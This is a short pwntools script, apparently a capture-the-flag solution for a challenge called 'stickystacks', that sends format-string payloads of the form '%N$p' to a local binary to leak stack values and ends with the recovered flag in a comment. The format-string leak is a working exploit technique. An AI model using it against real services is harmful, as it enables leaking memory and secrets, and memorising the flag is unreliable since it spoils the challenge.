from pwn import *

# find the offset with this in local
# pipe in a file and search for your local flag bytes

for i in range(100):
    r = process('stickystacks')
    r.recv()
    print('i = ', i)
    r.sendline('%'+str(i)+'$p')
    try:
        print(r.recvline())
    except:
        continue
    r.close()

#actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}
